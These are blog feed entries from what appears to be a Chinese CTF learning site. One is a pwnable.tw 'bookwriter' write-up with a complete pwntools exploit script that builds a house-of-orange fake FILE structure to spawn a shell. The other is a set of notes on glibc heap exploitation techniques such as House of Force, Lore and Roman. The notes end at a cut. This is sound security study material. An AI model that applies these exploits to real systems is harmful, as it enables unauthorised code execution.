根据调试结果计算</span><br>libcbase=unsortedbin-<span class="hljs-number">0x58</span>-<span class="hljs-number">0x3c3b20</span><br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>_IO_list_all=libcbase+libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(heap_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;_IO_list_all-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(_IO_list_all))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unsortedbin-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(unsortedbin))<br></code></pre></td></tr></table></figure><ul><li>接着分配到第九个堆块，让第一个堆块的记录的大小变成堆地址，这样就可以输入很大的数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># 为了通过检查</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x58</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>接着我们利用unsortedbin attack来修改IO_list_all（控制unsortbin的bk位目标地址-0x10），这一步我们将IO_list_all修改成了可unsortedbin链表头的地址（main_arena+88）</li><li>但此时这个空间是不可控的并且不满足执行overflow的条件，所以我们要继续找对应的chain字段存储的那个地址</li><li>而这个指针对应的地址是smallbin上的，我们要控制这个地址就需要一个在smallbin范围内的chunk，此时我们可以修改那个unsortedbin里的chunk的大小，使其会被连到smallbin的之中，至于改多大要看chain的位置，这里是改成0x60</li></ul><p><img src="/2025/06/11/pwnable.tw-bookwriter/1751042169760.png"></p><ul><li>因为我们之前将chunk[0]的大小改成很大，我们就可以利用0这个块来修改unsortedbin中的块</li><li>然后构造完FILE结构接着构造vtable表，利用我们之前泄露的堆地址在再计算一下偏移就可以得到vtable地址了</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">data=<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x310</span>)<br>vtable_addr=heap_addr+<span class="hljs-number">0x320</span>+<span class="hljs-number">0x80</span>+<span class="hljs-number">0x40</span>+<span class="hljs-number">0x20</span><br>fakefile=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0x61</span>)+p64(<span class="hljs-number">0</span>)+p64(_IO_list_all-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">3</span>)+p64(<span class="hljs-number">4</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">12</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(vtable_addr)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(system_addr) <span class="hljs-comment"># IO_list_all-0x10就是unsortedbin attack</span><br>edit(<span class="hljs-number">0</span>,data+fakefile)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(vtable_addr))<br><br>r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;Size of page :&quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">16</span>))<br><br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc_64.so.6&#x27;</span>)<br><span class="hljs-comment">#r=process(&#x27;./bookwriter&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>,<span class="hljs-number">10304</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Size of page :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content :&quot;</span>)<br>    r.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index of page :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index of page :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;Content:&quot;</span>)<br>    r.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params">cho,aut</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>)<br>    <span class="hljs-keyword">if</span> (cho):<br>        r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>        r.recvuntil(<span class="hljs-string">&quot;Author :&quot;</span>)<br>        r.sendline(<span class="hljs-built_in">str</span>(aut))<br>    <span class="hljs-keyword">else</span>:<br>        r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br>r.recvuntil(<span class="hljs-string">&quot;Author :&quot;</span>)<br>r.send(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x39</span>+<span class="hljs-string">b&#x27;yyyffff&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>) <span class="hljs-comment"># 0</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">b&#x27;\xe1&#x27;</span>+<span class="hljs-string">b&#x27;\x0f&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;yyyffff&quot;</span>)<br>heap_addr=u64(r.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x10</span> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(heap_addr))<br>r.recvuntil(<span class="hljs-string">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>add(<span class="hljs-number">0x58</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>) <span class="hljs-comment"># 1</span><br>view(<span class="hljs-number">1</span>)<br>r.recvuntil(<span class="hljs-string">&quot;Content :\naaaaaaaa&quot;</span>)<br>unsortedbin=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x610</span><br>libcbase=unsortedbin-<span class="hljs-number">0x58</span>-<span class="hljs-number">0x3c3b20</span><br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>_IO_list_all=libcbase+libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(heap_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;_IO_list_all-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(_IO_list_all))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unsortedbin-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(unsortedbin))<br><span class="hljs-comment">#pause()</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># 为了通过检查</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x58</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>pause()<br>data=<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x310</span>)<br>vtable_addr=heap_addr+<span class="hljs-number">0x320</span>+<span class="hljs-number">0x80</span>+<span class="hljs-number">0x40</span>+<span class="hljs-number">0x20</span><br>fakefile=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0x61</span>)+p64(<span class="hljs-number">0</span>)+p64(_IO_list_all-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">3</span>)+p64(<span class="hljs-number">4</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">12</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(vtable_addr)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(system_addr)<br>edit(<span class="hljs-number">0</span>,data+fakefile)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(vtable_addr))<br><br>r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;Size of page :&quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">16</span>))<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>参考wp</p><p> <a href="https://dreamkecat.github.io/2022/04/10/pwnable-bookwriter/">- pwn | dreamcat &#x3D; 我他喵的</a> </p><p> [<a href="https://bbs.kanxue.com/thread-223334.htm">原创]从BookWriter看house_of_orange原理【新手向】-Pwn-看雪-安全社区|安全招聘|kanxue.com</a> </p><p><a href="https://blingblingxuanxuan.github.io/2020/04/04/bookwriter/#I-O-FILE">https://blingblingxuanxuan.github.io/2020/04/04/bookwriter/#I-O-FILE</a></p>]]></content>
    
    
    <categories>
      
      <category>做题记录</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>各种 house of</title>
    <link href="/2025/06/07/%E5%90%84%E7%A7%8D%20house%20of/"/>
    <url>/2025/06/07/%E5%90%84%E7%A7%8D%20house%20of/</url>
    
    <content type="html"><![CDATA[<h1 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>对<code>top chunk</code>进行利用，在没有<code>free</code>存在的情况下创造<code>free</code>到<code>unsortedbin</code>中的空闲块，从而得到<code>unsortedbin</code>地址，在进行后续操作即可获得<code>main_arena</code>地址等</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当当前堆的top chunk尺寸不足以满足申请的分配大小的时候，原来的top chunk会被释放并且放入unsortedbin中，接着再映射或者扩展一个新top chunk出来</p><p>glibc2.23：</p><p>当其他bin都满足不了，topchunk也无法满足时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-comment">/* Record incoming configuration of top */</span><br><br>  old_top = av-&gt;top;<br>  old_size = chunksize (old_top);<br>  old_end = (<span class="hljs-type">char</span> *) (chunk_at_offset (old_top, old_size));<br><br>  brk = snd_brk = (<span class="hljs-type">char</span> *) (MORECORE_FAILURE);<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">     If not the first time through, we require old_size to be</span><br><span class="hljs-comment">     at least MINSIZE and to have prev_inuse set.</span><br><span class="hljs-comment">   */</span><br><span class="hljs-comment">//下面都是需要通过的检查</span><br>  assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>          ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>           prev_inuse (old_top) &amp;&amp;<br>           ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br><br>  <span class="hljs-comment">/* Precondition: not enough current space to satisfy nb request */</span><br>  assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE));<br></code></pre></td></tr></table></figure><p>条件:</p><ul><li>申请的size不能大于mmap分配阈值，默认128k</li><li>伪造size对齐的内存页</li><li>伪造size要大于MINSIZE(0x10)</li><li>伪造size要小于申请的chunk size+MINSIZE(0x10)</li><li>伪造size的prev inuse为必须为1</li></ul><p>过程：</p><ul><li>修改top chunk的size</li><li>申请一个大于top chunk的size<ul><li>scanf函数会申请一个0x1000的块，如果调用scanf的话就不用我们自己申请了，scanf调用完top chunk就会进入unsortedbin</li></ul></li></ul><h1 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p>利用堆块的向后合并机制强制使得malloc返回一个几乎任意地址的chunk</p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>向后合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) <br>    &#123;<br>      prevsize = p-&gt;prev_size;<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>      unlink(av, p, bck, fwd);<br>    &#125;<br></code></pre></td></tr></table></figure><p>要有溢出的漏洞，比如off-by-one等</p><p>过程：（设有三堆块分别是0，1，2。2块用来隔开top chunk，还有A块为目标地址）</p><ul><li>利用1块漏洞修改2块pre_inuse为0</li><li>利用1块漏洞修改2块pre_size为A块和2块之间距离，让2块释放时去找A块，也就是利用第6行的代码</li><li>在A块附近构造数据，以通过unlink检查</li><li>A块size位为chunksize(A)</li></ul><p>unlink检查：（2.26）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>, P, AV);<br>  .....<br>      <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV); <br></code></pre></td></tr></table></figure><ul><li>A块下一个块的prev_size字段要&#x3D;A块大小，就是 &amp;(A+chunksize(A))&#x3D;chunksize(A)</li><li>A块的fd，bk都指向A块的地址</li></ul><p>2.23只有第二个检查</p><ul><li>最后unlink将其放入了unsortedbin后需要将fd，bk改写为main_arena+88</li></ul><p>最后malloc就得到目标地址的堆块了</p><h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><h2 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h2><p>利用篡改top chunk的size，来实现任意地址分配</p><p>2.23-2.27</p><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>top chunk的分割机制（2.23）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">victim = av-&gt;top;<span class="hljs-comment">//获取top chunk</span><br>size = chunksize (victim);<span class="hljs-comment">//获取top的大小</span><br><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<span class="hljs-comment">//top chunk足够大</span><br>  &#123;<br>    remainder_size = size - nb;<span class="hljs-comment">//计算剩余</span><br>    remainder = chunk_at_offset (victim, nb);<span class="hljs-comment">//计算分割后指针</span><br>    av-&gt;top = remainder;<br>    set_head (victim, nb | PREV_INUSE |<br>              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head (remainder, remainder_size | PREV_INUSE);<span class="hljs-comment">//设置剩余部分头部信息</span><br><br>    check_malloced_chunk (av, victim, nb);<br>    <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>    alloc_perturb (p, bytes);<br>    <span class="hljs-keyword">return</span> p;<span class="hljs-comment">//返回分配的内存地址</span><br>  &#125;<br></code></pre></td></tr></table></figure><p>要可以控制top chunk的size域</p><p>要可以分配任意大小的堆块</p><p>过程：</p><ul><li>首先溢出将top chunk的size变成-1，因为比较时会把size看成无符号数，这样-1就是一个极大数，可以通过所有检查</li><li>然后分配一块空间，利用这块空间将top chunk推到目标地址附近，如果要推到高地址，就malloc(+)，推到低地址就malloc(-)，这块空间大小为<code>malloc_size = target_addr - top_chunk_addr - 2*sizeof(size_t);</code></li><li>然后再malloc一次就可以得到目标地址的堆块了</li></ul><h1 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h1><h2 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h2><p>利用篡改smallbins中free的块的bk来实现任意地址分配</p><p>&lt;&#x3D;2.26可以使用</p><p>2.27加入tcache，需要手动填满</p><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>smallbins中</p><ul><li>原理bins的堆块是更前面的堆块，所以fd指向远离bins的</li><li>靠近bins的堆块是更后面的堆块，所以bk指向靠近bins的</li></ul><p>smallbins的分配中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<span class="hljs-comment">//检查是否属于smallbin范围内</span><br>   &#123;<br>     idx = smallbin_index (nb);<span class="hljs-comment">//计算smallbin索引</span><br>     bin = bin_at (av, idx);<span class="hljs-comment">//获取smallbin指针</span><br><br>     <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<span class="hljs-comment">//尝试从smallbin中分配内存</span><br>       &#123;<br>         <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check（初始化检查） */</span><br>           malloc_consolidate (av);<span class="hljs-comment">//如果分配区还没初始化就初始化，这是初始化函数</span><br>         <span class="hljs-keyword">else</span><br>           &#123;<br>             bck = victim-&gt;bk;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="hljs-comment">//检查双向链表完整性</span><br>               &#123;<br>                 errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                 <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>             set_inuse_bit_at_offset (victim, nb);<span class="hljs-comment">//标记内存块已使用和设置内存块大小</span><br>              <span class="hljs-comment">//接下来两行是更新双向链表指针</span><br>             bin-&gt;bk = bck;<br>             bck-&gt;fd = bin;<br><br>             <span class="hljs-keyword">if</span> (av != &amp;main_arena)<span class="hljs-comment">//如果不属于主分配区，则进入if，标记为非主分配区</span><br>               victim-&gt;size |= NON_MAIN_ARENA;<br>             check_malloced_chunk (av, victim, nb);<span class="hljs-comment">//检查内存块</span><br>             <span class="hljs-type">void</span> *p = chunk2mem (victim);<span class="hljs-comment">//转换</span><br>             alloc_perturb (p, bytes);<br>             <span class="hljs-keyword">return</span> p;<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>主要利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">             bck = victim-&gt;bk;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="hljs-comment">//检查双向链表完整性</span><br>               &#123;<br>                 errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                 <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>             set_inuse_bit_at_offset (victim, nb);<span class="hljs-comment">//标记内存块已使用和设置内存块大小</span><br>              <span class="hljs-comment">//接下来两行是更新双向链表指针</span><br>             bin-&gt;bk = bck;<br>             bck-&gt;fd = bin;<br></code></pre></td></tr></table></figure><p>要可以修改 smallbin 中 chunk 的 bk 和 fake_chunk 的fd</p><p>过程</p><ul><li>修改 smallbins 中的 chunk 的 bk为 &amp;fake_chunk</li><li>修改f ake_chunk 的fd为 smallbins 中的 chunk 地址来通过检查</li><li>还需要另一个 fake_chunk 来使第二次分配时通过检查<ul><li>需要伪造 fake_chunk-&gt;bk&#x3D;&amp;fake_chunk2</li><li>需要 fake_chunk2-&gt;fd&#x3D;&amp;fake_chunk</li></ul></li><li>分配两次得到 fake_chunk</li></ul><h1 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h1><h2 id="概述-4"><a href="#概述-4" class="headerlink" title="概述"></a>概述</h2><p>利用 fastbin 和 malloc_consolidate 机制实现任意地址分配或读写</p><h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><p>利用 malloc_consolidate 的时候对 fastbin 中的堆块的 size 没有检查从而可以伪造一个 fake_chunk</p><ul><li><p>可以修改 fastbin 的 fd 或 size</p></li><li><p>可以触发  malloc consolidate</p></li></ul><p>利用过程</p><ul><li>修改size<ul><li>分配两个 chunk，fastbin 范围内，再来一个隔开 top chunk</li><li>free 前两个 chunk</li><li>修改第一个 chunksize 为 0xa1</li><li>接着 malloc(0x1000) 触发 malloc_consolidate </li><li>然后这两个快就被分别放到了对应的 smallbin 中</li></ul></li><li>修改 fd<ul><li>分配1个 chunk ，fastbin范围内，再来一个隔开top</li><li>free 掉第一个</li><li>修改第一个 fd 为 fake_chunk</li><li>接着 malloc(0x1000) 触发 malloc_consolidate </li><li>然后这个fake_chunk就合法了，可以对其进行其他操作</li></ul></li></ul><h1 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h1><h2 id="概述-5"><a href="#概述-5" class="headerlink" title="概述"></a>概述</h2><p>利用fastbins attack和unsortedbin attack来 绕过PIE</p><p>要有溢出写和UAF类似的漏洞</p><p>2.23-2.29</p><h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><ol><li>分配四个chunk(A,B,C,D)，chunkB大小为0x70</li><li>free(B)，B进入fastbin[0x70]</li><li>利用A来将B-&gt;size修改为unsortedbin范围内</li><li>再次释放B，B进入unsortedbin，此时fd，bk都是main_arena+88，修改fd为_malloc_hook-0x23</li><li>利用A再次修改B的size，使其符合fastbin[0x70]</li><li>接着利用unsortedbin attack将_malloc_hook处写成main_arena+88</li><li>然后利用部分写将该地址改成one_gadgets或system完成攻击</li></ol><h1 id="House-of-banana"><a href="#House-of-banana" class="headerlink" title="House of banana"></a>House of banana</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul><li><p>程序调用exit函数</p></li><li><p>或</p></li><li><p>程序通过libc_start_main启动的主函数，且主函数可以结束</p></li><li><p>glibc-2.23及以上</p></li><li><p>程序能够实现largebinattach</p></li></ul><h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p>程序退出时会有以下调用，也就是说如果可以控制 array[i] 为ogg，就可以getshell</p><figure 